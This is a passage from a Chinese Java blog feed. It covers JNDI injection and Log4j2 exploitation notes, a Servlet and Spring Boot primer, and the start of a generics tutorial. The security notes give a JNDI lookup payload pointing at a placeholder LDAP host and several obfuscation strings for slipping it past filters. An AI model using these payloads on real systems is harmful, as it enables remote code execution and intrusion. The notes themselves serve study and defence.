title="漏洞形成原因"></a>漏洞形成原因</h2><blockquote><p>JNDI支持从指定的远程服务器上下载class文件，加载到本地JVM中，并通过适当的方式创建对象。</p><p>如果目标应用进行了JNDI查询（<code>lookup</code>），并且其查询的地址或名称可控的话，就会形成JNDI注入漏洞</p></blockquote><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><img src="/../images/%E6%97%A0%E6%A0%87%E9%A2%98-2023-05-01-1454-1682925503892.png" alt="image-20230502220549589"></p><ol><li><p>攻击者构造恶意协议，传入服务端（目标应用）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">rmi:<span class="comment">//ip:port/name</span></span><br><span class="line">ldap:<span class="comment">//ip:port/name</span></span><br><span class="line">dns:<span class="comment">//外带.域名</span></span><br></pre></td></tr></table></figure></li><li><p>服务端连接到攻击者指定的服务，查询得到一个恶意的<code>JNDI Reference</code></p></li><li><p>服务端解析该恶意<code>JNDI Reference</code></p></li><li><p>根据解析结果到指定服务器上下载<code>Factory</code>的字节码</p></li><li><p>加载字节码，攻击者的恶意代码被执行</p></li></ol><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><h4 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h4><p>服务端</p><p><img src="/../images/image-20230501151253546.png" alt="image-20230501151253546"></p><p>RMI服务</p><p><img src="/../images/image-20230501151418991.png" alt="image-20230501151418991"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(className,classFactor,classFactoryLocation)</span><br></pre></td></tr></table></figure><blockquote><p><code>className</code>：远程加载时所使用的类名<br><code>classFactor</code>：加载的 class 中需要实例化类的名称<br><code>classFactoryLocation</code>：提供classes数据的地址可以是 file&#x2F;ftp&#x2F;http 等协议</p></blockquote><p>存放恶意字节码的WEB服务器</p><p>恶意字节码对应的java文件<img src="/../images/image-20230501151607225.png" alt="image-20230501151607225"></p><p>先启动RMI服务和web服务器</p><p><img src="/../images/image-20230501152041695.png" alt="image-20230501152041695"></p><p><img src="/../images/image-20230501152052702.png" alt="image-20230501152052702"></p><p>再启动Server</p><p><img src="/../images/image-20230501152145871.png" alt="image-20230501152145871"></p><p><img src="/../images/image-20230501152116749.png" alt="image-20230501152116749"></p><h4 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h4><p><img src="/../images/image-20230502172305622.png" alt="image-20230502172305622"></p><p><code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认为 <code>false</code>，所以会进入 <code>if</code> 语句，抛出异常。</p><h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><p>原理</p><p>绕过抛出异常后进入<code>javax.naming.spi.NamingManager</code> </p><p><img src="/../images/image-20230502172806278.png" alt="image-20230502172806278"></p><p><img src="/../images/image-20230502173802695.png" alt="image-20230502173802695"></p><p>实现</p><p><code>Tomcat Server</code>中的<code>BeanFactory</code>类，通过该类的<code>getObjectInstance</code>方法反射调用了<code>javax.el.ELProcessor</code>的<code>eval</code>方法，最终实现了EL表达式执行达到RCE的效果。</p><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><h4 id="低版本-1"><a href="#低版本-1" class="headerlink" title="低版本"></a>低版本</h4><p>同RMI，远程加载即可</p><h4 id="高版本-1"><a href="#高版本-1" class="headerlink" title="高版本"></a>高版本</h4><p>当从<code>LDAP Server</code>传来的对象是序列化对象时，会调用<code>readobject</code>方法，存在反序列化漏洞。</p><h3 id="版本影响"><a href="#版本影响" class="headerlink" title="版本影响"></a>版本影响</h3><p><code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认为 <code>false</code></p><p><img src="/../images/1586953-20210613173957090-164407195.png" alt="image-20230502220543519"></p><p>绕过方法</p><ul><li>利用本地Class作为Reference Factory</li><li>利用LDAP返回序列化数据，触发本地Gadget</li></ul><h2 id="Log4J2"><a href="#Log4J2" class="headerlink" title="Log4J2"></a>Log4J2</h2><p>Log4j是java用来处理日志的第三方组件，提供了<code>Lookups</code>的机制：</p><blockquote><p>会对日志中用 <code>$&#123;prefix:key&#125;</code>包裹起来的变量进行解析</p></blockquote><p><img src="/../images/image-20230426124656392.png" alt="image-20230426124656392"></p><p>当记录的信息为<code>$&#123;jndi:xxx&#125;</code>时,log4j2就会发起<code>JNDI Lookup</code>查询,从而触发JNDI注入漏洞。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;jndi:ldap://xxxx/a&#125;</span></span><br></pre></td></tr></table></figure><p>绕过</p><p><code>abc</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a<span class="variable">$&#123;:-b&#125;</span>c</span><br><span class="line"><span class="variable">$&#123;lower:b&#125;</span></span><br><span class="line">a<span class="variable">$&#123;::-b&#125;</span>c</span><br><span class="line">a<span class="variable">$&#123;E:-a&#125;</span>c</span><br><span class="line">a<span class="variable">$&#123;:-<span class="variable">$&#123;:-b&#125;</span>&#125;</span>c</span><br><span class="line">a<span class="variable">$&#123;xxxanycodexxxx:-b&#125;</span>c</span><br><span class="line">    </span><br><span class="line">unicode编码绕过</span><br><span class="line">插入空白字符绕过</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java Web</title>
      <link href="/2023/05/01/Java%20Web%E4%BA%86%E8%A7%A3/"/>
      <url>/2023/05/01/Java%20Web%E4%BA%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Servlet-Tomcat-JSP"><a href="#Servlet-Tomcat-JSP" class="headerlink" title="Servlet Tomcat JSP"></a>Servlet Tomcat JSP</h1><ul><li><p>Tomcat: 是Servlet的容器,Servlet运行在Tomcat容器当中,Servlet容器有很多(tomcat,Jboss,jetty)等</p></li><li><p>JSP: 全称Java Server Pages，是一种动态网页开发技术。它使用JSP标签在HTML网页中插入Java代码。标签通常以&lt;%开头以%&gt;结束。</p></li><li><p>Serlvet: 全称Java Servlet,是用Java编写的服务器端程序。Servlet只是一个Java类，就像控制器类一样，接收前端传过来的数据，然后进行处理。</p><blockquote><p>定义一个 Servlet 很简单，只需要继承<code>javax.servlet.http.HttpServlet</code>类并重写<code>doXXX</code>(如<code>doGet、doPost</code>)方法或者<code>service</code>方法就可以了</p><p><img src="/../images/image-20231020191711886.png" alt="image-20231020191711886"></p></blockquote></li></ul><h2 id="基于Web-xml配置–Servlet-lt-3-0"><a href="#基于Web-xml配置–Servlet-lt-3-0" class="headerlink" title="基于Web.xml配置–Servlet&lt;3.0"></a>基于Web.xml配置–Servlet&lt;3.0</h2><p><img src="/../images/201909251250360.png?lastModify=1695796287" alt="在这里插入图片描述"></p><p>页面和类是毫无关联的，需要在web.xml里面创建Url与Servlet之间的映射关系，<code>/login</code>由<code>FirstServlet</code>来进行处理</p><p><img src="/../images/image-20230925101303360.png" alt="image-20230925101303360"></p><p><strong>简单实现用户登录判断</strong></p><p>FirstServelt</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FirstServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">html</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span>.equals(name) &amp;&amp; <span class="string">&quot;123&quot;</span>.equals(password))</span><br><span class="line">            html = <span class="string">&quot;&lt;div style=&#x27;color:green&#x27;&gt;success&lt;/div&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            html = <span class="string">&quot;&lt;div style=&#x27;color:red&#x27;&gt;fail&lt;/div&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        pw.println(html);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.jsp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;login&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">  账号: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt; &lt;br&gt;</span><br><span class="line">  密码: &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt; &lt;br&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230925101208723.png" alt="image-20230925101208723"></p><p><img src="/../images/image-20230925101409954.png" alt="image-20230925101409954"></p><p>请求的处理流程：前端访问action，然后在web.xml会根据同名的url-pattern去访问对应的servlet类，servlet类里面做完相应的处理后，再返回内容到页面上</p><h2 id="基于注解–Servlet-gt-x3D-3-0"><a href="#基于注解–Servlet-gt-x3D-3-0" class="headerlink" title="基于注解–Servlet&gt;&#x3D;3.0"></a>基于注解–Servlet&gt;&#x3D;3.0</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;FirstServlet&quot;, urlPatterns = &#123;&quot;/login&quot;&#125;)</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;FirstServlet&quot;, urlPatterns = &#123;&quot;/login&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FirstServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">html</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span>.equals(name) &amp;&amp; <span class="string">&quot;123&quot;</span>.equals(password))</span><br><span class="line">            html = <span class="string">&quot;&lt;div style=&#x27;color:green&#x27;&gt;success&lt;/div&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            html = <span class="string">&quot;&lt;div style=&#x27;color:red&#x27;&gt;fail&lt;/div&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        pw.println(html);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="MVC设计思想"><a href="#MVC设计思想" class="headerlink" title="MVC设计思想"></a>MVC设计思想</h1><p><img src="/../images/1444254-20201027173804006-1676807374.png" alt="Java SpringMVC三层架构- Tanwheey - 博客园"></p><h1 id="ORM–对象关系映射"><a href="#ORM–对象关系映射" class="headerlink" title="ORM–对象关系映射"></a>ORM–对象关系映射</h1><p><img src="/../images/image-20231022144527013.png" alt="image-20231022144527013"></p><h1 id="SSH（Struts2-Spring-Hibernate）"><a href="#SSH（Struts2-Spring-Hibernate）" class="headerlink" title="SSH（Struts2 + Spring + Hibernate）"></a>SSH（Struts2 + Spring + Hibernate）</h1><p><strong>Struts2</strong></p><p><img src="/../images/423c25a95aab63788bf245d9b0716d5b.png" alt="img"></p><p>解析：客户端发送请求（HttpServletRequest）到服务器，服务器接收到请求就先进入web.xml配置文件看看有没有配置过滤器，发现有有Struts2的过滤器，然后找到struts.xml配置文件，struts.xml配置文件里定义一个action，然后就去找到action类，此类继承ActionSupport接口，并且实现了execute()方法，返回一个字符串“success”给struts.xml配置文件，struts.xml配置文件的action会默认调用action类的execute()方法，result接收到返回的字符串，result就会调用你指定的jsp页面将结果呈现，最后响应给客户端。</p><p><strong>Spring</strong> </p><p><img src="/../images/dffcf52ddeb68b17cd944aab3e6d07a4.png" alt="img"></p><p><strong>Hibernate</strong></p><p>Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个<strong>全自动的orm框架</strong>。</p><h1 id="SSM（SpringMVC-Spring-MyBatis）"><a href="#SSM（SpringMVC-Spring-MyBatis）" class="headerlink" title="SSM（SpringMVC + Spring + MyBatis）"></a>SSM（SpringMVC + Spring + MyBatis）</h1><ul><li><p>SpringMVC代替Struts2</p></li><li><p>MyBatis代替Hibernate</p></li><li><p>Spring并不是一个新的web框架，而是作者认为java的框架已经足够多且功能完善，只需要一个“工具”将他们整合起来即可，因此spring诞生了。</p><p>Spring最重要的两个思想IOC(DI)和AOP：</p><ul><li>IOC(DI)即控制反转（依赖注入），这里的控制指的是对类实例化的控制，反转是指通常类的实例化是由开发人员完成的，现在将这个权利给予容器（这里就是spring），告诉容器实例化类的方法，在使用时可以直接调用，降低的代码的耦合度和量，同时也增加了程序的可读性。</li><li>AOP即面向切面编程，简单理解就是将各个模块公用的模块（如打日志）抽出来，也可以降低代码的耦合度。</li></ul></li></ul><h1 id="Spring-Boot"><a href="#Spring-Boot" class="headerlink" title="Spring Boot"></a>Spring Boot</h1><p>Spring Boot 是对 Spring 工作流层面的演进，实现基于 Spring 的更便捷的生产级别应用。<br>Spring Boot 的优点：</p><ul><li>内嵌 Servlet 容器，独立运行的 Spring 项目，Spring Boot 可以内嵌 Tomcat，以 java -jar xx.jar 包的形式来运行一个 Spring Boot 应用，省略了 war 包部署的繁琐。</li><li>提供 starter 机制简化 Maven 依赖管理与 Spring 配置，如仅需要引入“spring-boot-starter-web”就可以包含 Spring 和 SpringMVC 相关的依赖和配置。</li></ul><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><p><img src="/../images/image-20231026152523289.png" alt="image-20231026152523289"></p><p><a href="https://blog.csdn.net/SThranduil/article/details/86680531">过滤器（Filter）和 拦截器（Interceptor ) 的区别_filter_security_interceptor-CSDN博客</a></p><p>另外还要注意<code>POM.xml</code></p><ul><li><p><code>pom.xml</code>： Maven 构建说明文件（管理项目依赖）</p><p>spring-boot项目特有的标签</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>有了这个，当前的项目才是 Spring Boot 项目，spring-boot-starter-parent 是一个特殊的 starter ，它用来提供相关的Maven默认依赖。<strong>使用它之后，常用的包依赖就可以省去 version 标签，关于具体 Spring Boot 提供了哪些 jar 包的依赖，我们可以查看本地 Maven 仓库下：\repository\org\springframework\boot\spring-boot-dependencies\2.2.2.RELEASE\spring-boot-dependencies-2.2.2.RELEASE.pom 文件来查看</strong></p></blockquote><p>比如说spring boot内置了Tomcat作为默认的Servlet容器，2.2.2版本对应的Tomcat版本为9.0.29。</p><blockquote><p><img src="/../images/image-20230930202303209.png" alt="image-20230930202303209"></p></blockquote></li><li><p><strong>项目配置文件</strong>在<code>src/main/resources</code>目录下</p><p><code>application.properties</code>或者<code>application.yml</code></p><p><img src="/../images/2019123117071828.png" alt="img"></p></li><li><p><strong>应用入口类</strong></p><blockquote><p>Spring Boot 项目通常有一个名为 *Application 的入口类，入口类里有一个 main 方法， <strong>这个 main 方法其实就是一个标准的 Java 应用的入口方法。</strong></p></blockquote></li></ul><h2 id="请求传递流程"><a href="#请求传递流程" class="headerlink" title="请求传递流程"></a>请求传递流程</h2><p><img src="/../images/request-path.png" alt="request-path"></p><p>为了更好理解，以「保存订单」功能为例，主要的请求流程如下图，不了解Spring请求传递的同学可以在代码中跟一遍请求流程，会加深请求传递的印象。</p><p><img src="/../images/request-example.png" alt="request-example"></p><h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@SpringBootApplication: 用于标识主类，表明这是一个 Spring Boot 应用程序的入口点。它组合了 @Configuration、@EnableAutoConfiguration 和 @ComponentScan 注解。</span><br><span class="line"></span><br><span class="line">@RestController: 标识一个类为 RESTful 风格的控制器，用于处理 HTTP 请求并返回响应。</span><br><span class="line"></span><br><span class="line">@RequestMapping: 定义请求的 URL 路径，可用于类级别或方法级别。用于映射 HTTP 请求到相应的控制器方法。</span><br><span class="line"></span><br><span class="line">@GetMapping, @PostMapping, @PutMapping, @DeleteMapping: 分别用于标识 GET、POST、PUT 和 DELETE 请求的处理方法。</span><br><span class="line"></span><br><span class="line">@RequestBody: 用于将请求体的内容绑定到方法参数上，通常用于接收 JSON 或 XML 数据。</span><br><span class="line"></span><br><span class="line">@PathVariable: 用于从 URL 路径中获取变量值，并将其绑定到方法参数上。</span><br><span class="line"></span><br><span class="line">@RequestParam: 用于获取请求参数的值，并将其绑定到方法参数上。</span><br><span class="line"></span><br><span class="line">@Autowired: 自动装配依赖项，通过类型来查找匹配的 bean，并注入到字段、构造函数或方法参数中。</span><br><span class="line"></span><br><span class="line">@Value: 用于将属性值注入到字段、构造函数或方法参数中。</span><br><span class="line"></span><br><span class="line">@Configuration: 声明一个类作为配置类，用于定义 bean 的创建和配置。</span><br><span class="line"></span><br><span class="line">@Component: 标识一个类为 Spring 组件，会被自动扫描并创建为 bean。</span><br><span class="line"></span><br><span class="line">@Service: 标识一个类为服务层组件，通常用于注解业务逻辑的实现类。</span><br><span class="line"></span><br><span class="line">@Repository: 标识一个类为数据访问层组件，通常用于注解数据库操作的实现类。</span><br><span class="line"></span><br><span class="line">@EnableAutoConfiguration: 开启自动配置功能，Spring Boot 会根据项目的依赖和配置自动进行相应的配置。</span><br><span class="line"></span><br><span class="line">@Conditional: 根据条件来决定是否创建某个 bean 或执行某段代码。</span><br></pre></td></tr></table></figure><p>在<code>application.yml</code>中添加</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/</span></span><br><span class="line"></span><br><span class="line"><span class="attr">name:</span> <span class="string">Khaz</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">18</span></span><br><span class="line"></span><br><span class="line"><span class="attr">content:</span> <span class="string">&quot;name$&#123;name&#125;,age$&#123;age&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>新建<code>HelloController</code>类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;age&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name + <span class="string">&quot;:&quot;</span>+age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@RestController</code>所以数据格式为json格式</p><p><img src="/../images/image-20230925113401628.png" alt="image-20230925113401628"></p><h2 id="运行jsp"><a href="#运行jsp" class="headerlink" title="运行jsp"></a>运行jsp</h2><p><strong>依赖</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--jsp--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--servlet--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--jstl--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>主流的目录结构</strong></p><blockquote><p>非必须，配置好视图路径前缀即可</p></blockquote><p><img src="/../images/image-20230925115020412.png" alt="image-20230925115020412"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─WEBAPP</span><br><span class="line">    └─WEB-INF</span><br><span class="line">        └─jsp</span><br><span class="line">            └─index.jsp</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230925115955133.png" alt="image-20230925115955133"></p><p><strong>配置视图</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">mvc:</span></span><br><span class="line">    <span class="attr">view:</span></span><br><span class="line">      <span class="attr">prefix:</span> <span class="string">/WEB-INF/jsp/</span></span><br><span class="line">      <span class="attr">suffix:</span> <span class="string">.jsp</span></span><br></pre></td></tr></table></figure><blockquote><p>prefix需要加上&#x2F;，路径的拼接为前缀+视图名称+后缀：&#x2F;WEB-INF&#x2F;jsp&#x2F;index.jsp</p></blockquote><p><strong>控制类</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;web&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;index&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过<code>@Controller</code>注解将<code>WebController</code>类声明为Spring MVC的控制器。</li><li>使用<code>@RequestMapping(&quot;web&quot;)</code>注解将<code>web</code>作为基本URL路径，表示该控制器处理以<code>/web</code>开头的请求。</li><li>在<code>index</code>方法上使用<code>@RequestMapping(value = &quot;index&quot;, method = RequestMethod.GET)</code>注解来映射具体的请求路径，即处理以<code>/web/index</code>的GET请求。</li><li>方法返回一个字符串 <code>&quot;index&quot;</code>，表示要渲染名为<code>index</code>的视图。</li></ul><p><strong>运行结果</strong></p><p><img src="/../images/image-20230925120058229.png" alt="image-20230925120058229"></p><h1 id="SpringCloud-了解即可"><a href="#SpringCloud-了解即可" class="headerlink" title="SpringCloud (了解即可)"></a>SpringCloud (了解即可)</h1><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/hezhimin1124/article/details/103782745">通过IDEA搭建springboot项目（maven方式）_idea创建springboot +maven_智Min的博客-CSDN博客</a></p><p><a href="https://congzhou09.github.io/knowledge/Java-web-%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%9E%B6%E6%9E%84%E6%BC%94%E8%BF%9B%E5%8E%86%E5%8F%B2.html">https://congzhou09.github.io/knowledge/Java-web-%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%9E%B6%E6%9E%84%E6%BC%94%E8%BF%9B%E5%8E%86%E5%8F%B2.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java泛型</title>
      <link href="/2023/05/01/Java%E6%B3%9B%E5%9E%8B/"/>
      <url>/2023/05/01/Java%E6%B3%9B%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><p><a href="https://www.cnblogs.com/coprince/p/8603492.html">java 泛型详解-绝对是对泛型方法讲解最详细的，没有之一 - little fat - 博客园 (cnblogs.com)</a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; stringList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(); <span class="comment">// 使用泛型类List，并传入String类型实参</span></span><br><span class="line">stringList.add(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">stringList.add(<span class="string">&quot;World&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">firstElement</span> <span class="operator">=</span> stringList.get(<span class="number">0</span>); <span class="comment">// 获取列表中的第一个元素</span></span><br></pre></td></tr></table></figure><blockquote><p>定义一个泛型类<code>List&lt;T&gt;</code>，其中<code>T</code>为类型形参，表示列表中元素的类型。在使用该泛型类时，需要传入具体的类型实参作为类型形参的取值。</p></blockquote><ul><li><p><strong>类型形参</strong>指的是在定义泛型类、接口或方法时使用的占位符类型。它们用于参数列表、返回值类型、局部变量等位置，用来表示具体的数据类型还未确定。通常使用大写字母来表示类型形参，例如<code>T</code>、<code>E</code>、<code>K</code>等。</p></li><li><p><strong>类型实参</strong>指的是在使用泛型类、接口或方法时实际传入的具体数据类型。它们用于替换类型形参，使泛型类、接口或方法具体化。</p><p><img 